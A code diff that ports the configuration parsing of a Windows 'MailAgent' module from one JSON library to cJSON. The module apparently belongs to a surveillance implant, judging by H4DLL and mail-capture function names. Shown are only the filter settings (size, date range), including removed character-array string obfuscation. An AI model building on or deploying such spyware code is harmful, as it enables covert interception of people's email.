@@ -1,5 +1,5 @@
 #include <Windows.h>
-#include <json/JSON.h>
+#include <cJSON/cJSON.h>
 #include "MailAgent.h"
 #include "../../H4DLL/common.h"
 #include "../../H4DLL/AM_Core.h"
@@ -81,29 +81,18 @@ DWORD WINAPI PM_MailCapStartStop(BOOL bStartFlag, BOOL bReset)
 }
 
 
-DWORD WINAPI PM_MailCapInit(JSONObject elem)
+DWORD WINAPI PM_MailCapInit(cJSON *elem)
 {
-	JSONObject mail, filter;
-	WCHAR mail_tag[] = { 'm', 'a', 'i', 'l', 0 };
-	WCHAR filter_tag[] = { 'f', 'i', 'l', 't', 'e', 'r', 0 };
-
-	if (!elem[mail_tag]->IsObject())
-		return 1;
-
-	mail = elem[mail_tag]->AsObject();
-
-	if (!mail[filter_tag]->IsObject())
-		return 1;
-
-	filter = mail[filter_tag]->AsObject();
-	g_mail_filter.max_size = (DWORD)filter[L"maxsize"]->AsNumber();
+	cJSON* mail = cJSON_GetObjectItem(elem, "mail");
+	cJSON* filter = cJSON_GetObjectItem(mail, "filter");
+	g_mail_filter.max_size = (DWORD)cJSON_GetNumberValue(cJSON_GetObjectItem(filter, "maxsize"));
 	g_mail_filter.search_string[0] = L'*';
 	g_mail_filter.search_string[1] = 0;
 
-	HM_TimeStringToFileTime(filter[L"datefrom"]->AsString().c_str(), &g_mail_filter.min_date);
+	HM_TimeStringToFileTime(cJSON_GetStringValue(cJSON_GetObjectItem(filter, "datefrom")), &g_mail_filter.min_date);
 
-	if (filter[L"dateto"])
-		HM_TimeStringToFileTime(filter[L"dateto"]->AsString().c_str(), &g_mail_filter.max_date);
+	if (cJSON_GetObjectItem(filter, "dateto"))
+		HM_TimeStringToFileTime(cJSON_GetStringValue(cJSON_GetObjectItem(filter, "dateto")), &g_mail_filter.max_date);
 	else {
 		g_mail_filter.max_date.dwHighDateTime = 0xffffffff;
 		g_mail_filter.max_date.dwLowDateTime = 0xffffffff;
